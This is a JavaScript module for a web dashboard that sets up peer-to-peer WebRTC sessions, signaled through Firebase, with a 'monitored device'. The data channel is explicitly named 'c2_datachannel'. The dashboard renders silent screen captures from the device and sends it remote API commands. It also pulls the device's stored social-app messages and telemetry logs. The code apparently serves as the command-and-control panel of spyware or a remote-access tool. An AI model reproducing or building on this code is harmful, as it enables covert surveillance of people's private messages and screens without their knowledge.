// webrtc-manager.js - Browser Direct WebRTC P2P Manager (STUN-Only Direct P2P & DataChannel Protocol)

let pc = null;
let dc = null;
let activeSessionId = null;
let polite = true; // Dashboard is the Polite Peer
let makingOffer = false;
let ignoreOffer = false;
let p2pPingInterval = null;
let lastCalculatedRtt = 0;

function updateWebRtcConnectionBadge(statusType, detailText = "") {
    const connBadge = document.getElementById("connectionModeBadge");
    const statusBadge = document.getElementById("p2pStatusBadge");

    let badgeClass = "badge bg-secondary bg-opacity-10 text-secondary border border-secondary px-3 py-2";
    let badgeHtml = '<i class="fa-solid fa-power-off me-1 text-secondary"></i>P2P Disconnected';
    let streamText = "P2P WebRTC Standby";

    if (statusType === "CONNECTING") {
        badgeClass = "badge bg-warning bg-opacity-10 text-warning border border-warning px-3 py-2";
        badgeHtml = '<i class="fa-solid fa-spinner fa-spin me-1"></i>P2P Direct: ICE Handshake... 📡';
        streamText = "P2P Handshake In Progress... 📡";
    } else if (statusType === "P2P_DIRECT_CONNECTED") {
        badgeClass = "badge bg-info bg-opacity-10 text-info border border-info px-3 py-2";
        const rttStr = detailText ? ` (${detailText} RTT)` : "";
        badgeHtml = `<i class="fa-solid fa-bolt me-1 text-info"></i>P2P Direct Connected ⚡${rttStr}`;
        streamText = `P2P Direct Connected ⚡${rttStr}`;
    } else if (statusType === "DATA_CHANNEL_READY") {
        badgeClass = "badge bg-success bg-opacity-10 text-success border border-success px-3 py-2";
        const rttStr = detailText ? ` (${detailText} RTT)` : "";
        badgeHtml = `<i class="fa-solid fa-circle-check me-1 text-success"></i>DataChannel Ready 🟢${rttStr}`;
        streamText = `DataChannel Ready 🟢${rttStr}`;
    } else if (statusType === "ICE_FAILED" || statusType === "CONNECTION_FAILED") {
        badgeClass = "badge bg-danger bg-opacity-10 text-danger border border-danger px-3 py-2";
        badgeHtml = '<i class="fa-solid fa-triangle-exclamation me-1"></i>ICE Connection Failed (P2P Unavailable)';
        streamText = "ICE Connection Failed 🔴";
    } else if (statusType === "DATA_CHANNEL_FAILED") {
        badgeClass = "badge bg-danger bg-opacity-10 text-danger border border-danger px-3 py-2";
        badgeHtml = '<i class="fa-solid fa-triangle-exclamation me-1"></i>DataChannel Failed (P2P Disconnected)';
        streamText = "DataChannel Failed 🔴";
    } else if (statusType === "DEVICE_UNREACHABLE") {
        badgeClass = "badge bg-danger bg-opacity-10 text-danger border border-danger px-3 py-2";
        badgeHtml = '<i class="fa-solid fa-mobile-off me-1"></i>Target Device Unreachable';
        streamText = "Target Device Unreachable 🔴";
    } else if (statusType === "DISCONNECTED") {
        badgeClass = "badge bg-secondary bg-opacity-10 text-secondary border border-secondary px-3 py-2";
        badgeHtml = '<i class="fa-solid fa-power-off me-1 text-secondary"></i>P2P Disconnected';
        streamText = "P2P Disconnected 🔴";
    }

    if (connBadge) {
        connBadge.className = badgeClass;
        connBadge.innerHTML = badgeHtml;
    }
    if (statusBadge) {
        statusBadge.innerText = streamText;
    }
}

function connectP2pWebRtcTunnel() {
    const devId = typeof activeDeviceId !== "undefined" ? activeDeviceId : "DEV_MONITORED_DEVICE";
    const sessionId = "sess_" + devId + "_" + Date.now();
    console.log(`[WebRTC Manager] Requesting Direct P2P WebRTC Tunnel for device '${devId}' (Session: ${sessionId})`);
    updateWebRtcConnectionBadge("CONNECTING");
    initWebRtcSession(sessionId, true);
}

function initWebRtcSession(sessionId, isInitiator) {
    activeSessionId = sessionId;
    console.log(`[WebRTC Manager] Initializing Session: ${sessionId} (Initiator: ${isInitiator})`);

    // Enforce STUN-Only ICE negotiation per Section 3 Direct-Only P2P policy (No TURN Servers)
    const rtcConfig = {
        iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" },
            { urls: "stun:stun2.l.google.com:19302" },
            { urls: "stun:stun.relay.metered.ca:80" }
        ]
    };

    if (pc) {
        try { pc.close(); } catch (_) {}
    }

    pc = new RTCPeerConnection(rtcConfig);

    pc.onicecandidate = ({ candidate }) => {
        if (candidate) {
            // Filter and reject relay candidates explicitly
            if (candidate.candidate && candidate.candidate.includes("typ relay")) {
                console.warn("[WebRTC Manager] Rejected relay candidate per Direct-Only policy:", candidate.candidate);
                return;
            }
            sendIceCandidateToFirebase(sessionId, candidate);
        }
    };

    pc.ontrack = (event) => {
        console.log("[WebRTC Manager] Received Remote Media Track", event.streams[0]);
        const videoElement = document.getElementById("webstreamPlayer");
        if (videoElement && event.streams[0]) {
            videoElement.srcObject = event.streams[0];
            videoElement.play().catch(e => console.warn("Video play error:", e));
        }
    };

    pc.ondatachannel = (event) => {
        dc = event.channel;
        setupDataChannelEvents(dc);
    };

    if (isInitiator) {
        dc = pc.createDataChannel("c2_datachannel", { ordered: true });
        setupDataChannelEvents(dc);
        postSessionRequestedToFirebase(sessionId);
    }

    pc.oniceconnectionstatechange = () => {
        console.log("[WebRTC Manager] ICE Connection State:", pc.iceConnectionState);
        if (pc.iceConnectionState === "checking" || pc.iceConnectionState === "new") {
            updateWebRtcConnectionBadge("CONNECTING");
        } else if (pc.iceConnectionState === "connected" || pc.iceConnectionState === "completed") {
            verifySelectedIceCandidatePair();
        } else if (pc.iceConnectionState === "disconnected" || pc.iceConnectionState === "failed") {
            console.warn("[WebRTC Manager] Direct P2P PeerConnection failed.");
            updateWebRtcConnectionBadge("ICE_FAILED");
        }
    };

    pc.onnegotiationneeded = async () => {
        try {
            makingOffer = true;
            await pc.setLocalDescription();
            sendSdpOfferToFirebase(sessionId, pc.localDescription);
        } catch (err) {
            console.error("[WebRTC Manager] Negotiation error:", err);
        } finally {
            makingOffer = false;
        }
    };

    subscribeFirebaseSignalingEvents(sessionId);
}

function verifySelectedIceCandidatePair() {
    if (!pc || typeof pc.getStats !== "function") {
        updateWebRtcConnectionBadge("P2P_DIRECT_CONNECTED");
        return;
    }

    pc.getStats(null).then(stats => {
        let isRelay = false;
        let isDirect = false;

        stats.forEach(report => {
            if (report.type === "candidate-pair" && report.state === "succeeded") {
                const localCand = stats.get(report.localCandidateId);
                const remoteCand = stats.get(report.remoteCandidateId);

                if ((localCand && localCand.candidateType === "relay") || (remoteCand && remoteCand.candidateType === "relay")) {
                    isRelay = true;
                } else if (localCand && (localCand.candidateType === "host" || localCand.candidateType === "srflx")) {
                    isDirect = true;
                }
            }
        });

        if (isRelay) {
            console.error("[WebRTC Manager] Selected candidate pair is RELAY! Terminating session per Direct-Only P2P policy.");
            updateWebRtcConnectionBadge("ICE_FAILED");
            stopP2pWebStreamSession();
        } else if (isDirect) {
            console.log("[WebRTC Manager] Verified Direct P2P candidate pair (host/srflx) ⚡");
            updateWebRtcConnectionBadge("P2P_DIRECT_CONNECTED");
        } else {
            updateWebRtcConnectionBadge("P2P_DIRECT_CONNECTED");
        }
    }).catch(_ => {
        updateWebRtcConnectionBadge("P2P_DIRECT_CONNECTED");
    });
}

function setupDataChannelEvents(channel) {
    try {
        channel.bufferedAmountLowThreshold = 131072;
    } catch (_) {}

    channel.onopen = () => {
        console.log("[WebRTC Manager] Direct P2P RTCDataChannel OPEN 🟢");
        verifySelectedIceCandidatePair();
        updateWebRtcConnectionBadge("DATA_CHANNEL_READY");

        if (p2pPingInterval) clearInterval(p2pPingInterval);
        p2pPingInterval = setInterval(() => {
            if (dc && dc.readyState === "open") {
                const pingPayload = {
                    version: "1.0",
                    type: "PING",
                    timestamp: Date.now()
                };
                dc.send(JSON.stringify(pingPayload));
            }
        }, 4000);
    };

    channel.onclose = () => {
        console.log("[WebRTC Manager] Direct P2P RTCDataChannel CLOSED");
        if (p2pPingInterval) clearInterval(p2pPingInterval);
        updateWebRtcConnectionBadge("DISCONNECTED");
    };

    channel.onerror = (err) => {
        console.error("[WebRTC Manager] DataChannel error:", err);
        updateWebRtcConnectionBadge("DATA_CHANNEL_FAILED");
    };

    channel.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            if (data.type === "PONG") {
                const sentTs = data.payload?.timestamp || data.timestamp;
                if (sentTs) {
                    lastCalculatedRtt = Math.max(1, Date.now() - sentTs);
                    updateWebRtcConnectionBadge("DATA_CHANNEL_READY", `${lastCalculatedRtt}ms`);
                }
            } else if (data.type === "API_RESPONSE" && data.payload && data.payload.requestId) {
                const reqId = data.payload.requestId;
                if (apiPendingCallbacks.has(reqId)) {
                    const { resolve } = apiPendingCallbacks.get(reqId);
                    apiPendingCallbacks.delete(reqId);
                    resolve(data.payload.data);
                }
            } else if (data.type === "SCREEN_FRAME" && data.payload && data.payload.frame) {
                renderSilentScreencapFrame(data.payload.frame);
            } else if (data.type === "DB_RESPONSE_SOCIAL" && data.payload && data.payload.messages) {
                handleP2pSocialDatabaseResponse(data.payload.appKey, data.payload.messages);
            } else if (data.type === "DB_RESPONSE_TELEMETRY" && data.payload && data.payload.logs) {
                handleP2pTelemetryDatabaseResponse(data.payload.category, data.payload.logs);
            }
        } catch (e) {
            console.log("[WebRTC Manager] P2P Message Received:", event.data);
        }
    };
}

const apiPendingCallbacks = new Map();

function sendWebDashboardApiRequest(path, method = "GET", body = null) {
    return new Promise((resolve, reject) => {
        const requestId = "req_" + Date.now() + "_" + Math.floor(Math.random() * 10000);
        const targetDeviceId = typeof activeDeviceId !== "undefined" ? activeDeviceId : "DEV_MONITORED_DEVICE";

        if (!dc || dc.readyState !== "open") {
            console.warn(`[WebRTC Direct P2P API] Failed: DataChannel is not OPEN for ${method} ${path}`);
            updateWebRtcConnectionBadge("DATA_CHANNEL_FAILED");
            reject(new Error("P2P DataChannel is not connected (DATA_CHANNEL_FAILED). Interactive operations require direct P2P connection."));
            return;
        }

        apiPendingCallbacks.set(requestId, { resolve, reject });

        const reqPayload = {
            version: "1.0",
            type: "API_REQUEST",
            requestId: requestId,
            deviceId: targetDeviceId,
            path: path,
            method: method,
            body: typeof body === "object" && body !== null ? JSON.stringify(body) : (body || ""),
            timestamp: Date.now()
        };

        dc.send(JSON.stringify(reqPayload));
        console.log(`[WebRTC Direct P2P API] Transmitted: ${method} ${path} (${requestId})`);

        setTimeout(() => {
            if (apiPendingCallbacks.has(requestId)) {
                apiPendingCallbacks.delete(requestId);
                reject(new Error("Direct P2P Request Timeout (15s)"));
            }
        }, 15000);
    });
}

function queryP2pLocalDatabase(queryType, keyParam) {
    if (dc && dc.readyState === "open") {
        const targetDeviceId = typeof activeDeviceId !== "undefined" ? activeDeviceId : "DEV_MONITORED_DEVICE";
        const payload = queryType === "SOCIAL" ?
            { version: "1.0", type: "DB_QUERY_SOCIAL", deviceId: targetDeviceId, appKey: keyParam, timestamp: Date.now() } :
            { version: "1.0", type: "DB_QUERY_TELEMETRY", deviceId: targetDeviceId, category: keyParam, timestamp: Date.now() };
        dc.send(JSON.stringify(payload));
        console.log(`[WebRTC Direct P2P DB Query] Transmitted: ${queryType} (${keyParam})`);
    }
}

function renderSilentScreencapFrame(base64Frame) {
    const canvas = document.getElementById("liveScreenCanvas");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    const img = new Image();
    img.onload = () => {
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    };
    img.src = base64Frame.startsWith("data:") ? base64Frame : `data:image/jpeg;base64,${base64Frame}`;
}

async function handleRemoteOfferSignal(offerSdp) {
    if (!pc) return;
    const offer = new RTCSessionDescription({ type: "offer", sdp: offerSdp });
    const offerCollision = makingOffer || pc.signalingState !== "stable";
    ignoreOffer = !polite && offerCollision;
    if (ignoreOffer) return;

    if (offerCollision) {
        await pc.setLocalDescription({ type: "rollback" });
    }
    await pc.setRemoteDescription(offer);
    await pc.setLocalDescription();
    sendSdpAnswerToFirebase(activeSessionId, pc.localDescription);
}

async function handleRemoteAnswerSignal(answerSdp) {
    if (!pc) return;
    const answer = new RTCSessionDescription({ type: "answer", sdp: answerSdp });
    await pc.setRemoteDescription(answer);
}

function postSessionRequestedToFirebase(sessionId) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const sessionData = {
        status: "REQUESTED",
        requestedCapabilities: ["SCREEN", "DATA"],
        timestamp: Date.now()
    };
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}`).update(sessionData);
}

function sendSdpOfferToFirebase(sessionId, desc) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const offerPayload = {
        type: desc.type,
        sdp: desc.sdp,
        revision: 1
    };
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/offer`).set(offerPayload);
}

function sendSdpAnswerToFirebase(sessionId, desc) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/answer`).set({
        type: desc.type,
        sdp: desc.sdp,
        revision: 1
    });
}

function sendIceCandidateToFirebase(sessionId, candidate) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/candidates`).push({
        sender: "DASHBOARD",
        candidate: candidate.candidate,
        sdpMid: candidate.sdpMid,
        sdpMLineIndex: candidate.sdpMLineIndex
    });
}

let pendingIceCandidates = [];

function addRemoteCandidateOrBuffer(candData) {
    const candStr = candData.candidate || "";
    if (candStr.includes("typ relay")) {
        console.warn("[WebRTC Manager] Rejected remote relay candidate per Direct-Only policy:", candStr);
        return;
    }
    const rtcCand = new RTCIceCandidate(candData);
    if (pc && pc.remoteDescription && pc.remoteDescription.type) {
        pc.addIceCandidate(rtcCand).catch(e => console.warn("[WebRTC Candidate Add Error]", e));
    } else {
        pendingIceCandidates.push(rtcCand);
        console.log("[WebRTC Candidate Buffered] Queued early ICE candidate prior to remoteDescription");
    }
}

async function drainPendingIceCandidates() {
    if (!pc || !pc.remoteDescription || pendingIceCandidates.length === 0) return;
    console.log(`[WebRTC Candidate Drain] Flushing ${pendingIceCandidates.length} buffered ICE candidates...`);
    for (const cand of pendingIceCandidates) {
        try {
            await pc.addIceCandidate(cand);
        } catch (e) {
            console.warn("[WebRTC Buffered Candidate Error]", e);
        }
    }
    pendingIceCandidates = [];
}

function subscribeFirebaseSignalingEvents(sessionId) {
    if (!currentUser || !currentUser.uid) return;
    const uid = currentUser.uid;
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const sessionRef = firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}`);

    sessionRef.on("value", snapshot => {
        const val = snapshot.val();
        if (!val) return;

        if (val.answer && val.answer.sdp && !val.answerProcessed) {
            sessionRef.child("answerProcessed").set(true);
            handleRemoteAnswerSignal(val.answer.sdp);
        }

        if (val.offer && val.offer.sdp && !val.offerProcessed) {
            sessionRef.child("offerProcessed").set(true);
            handleRemoteOfferSignal(val.offer.sdp);
        }

        if (val.candidates) {
            Object.keys(val.candidates).forEach(key => {
                const cand = val.candidates[key];
                if (cand.sender !== "DASHBOARD" && !cand.processed) {
                    sessionRef.child(`candidates/${key}/processed`).set(true);
                    addRemoteCandidateOrBuffer(cand);
                }
            });
        }
    });
}

async function handleRemoteOfferSignal(sdp) {
    if (!pc) return;
    try {
        const offerCollision = (makingOffer || pc.signalingState !== "stable");
        ignoreOffer = !polite && offerCollision;
        if (ignoreOffer) {
            console.log("[WebRTC Perfect Negotiation] Impolite peer ignoring colliding offer");
            return;
        }

        const offerDesc = new RTCSessionDescription({ type: "offer", sdp: sdp });
        await pc.setRemoteDescription(offerDesc);
        await drainPendingIceCandidates();

        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        if (activeSessionId) {
            sendSdpAnswerToFirebase(activeSessionId, pc.localDescription);
        }
    } catch (err) {
        console.error("[WebRTC Manager] Error handling remote offer signal:", err);
    }
}

async function handleRemoteAnswerSignal(sdp) {
    if (!pc) return;
    try {
        const answerDesc = new RTCSessionDescription({ type: "answer", sdp: sdp });
        await pc.setRemoteDescription(answerDesc);
        await drainPendingIceCandidates();
        console.log("[WebRTC Manager] Successfully installed Remote Answer SDP");
    } catch (err) {
        console.error("[WebRTC Manager] Error handling remote answer signal:", err);
    }
}

function startP2pWebStreamSession() {
    const sessId = "sess_" + Date.now();
    initWebRtcSession(sessId, true);
    console.log("[WebRTC Manager] Dispatched WebRTC Direct P2P Session Request:", sessId);
}

function stopP2pWebStreamSession() {
    console.log("[WebRTC Manager] Stopping WebRTC Direct P2P Session:", activeSessionId);
    try {
        if (activeSessionId && currentUser && currentUser.uid) {
            const uid = currentUser.uid;
            const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
            firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${activeSessionId}`).update({
                status: "TERMINATED",
                terminatedAt: Date.now()
            });
        }
        if (dc) { try { dc.close(); } catch (_) {} dc = null; }
        if (pc) { try { pc.close(); } catch (_) {} pc = null; }
    } catch (e) {
        console.warn("[WebRTC Teardown Error]", e);
    } finally {
        activeSessionId = null;
        pendingIceCandidates = [];
        updateWebRtcConnectionBadge("DISCONNECTED");
        const statusBadge = document.getElementById("p2pStatusBadge");
        if (statusBadge) statusBadge.innerText = "P2P Session Idle";
    }
}
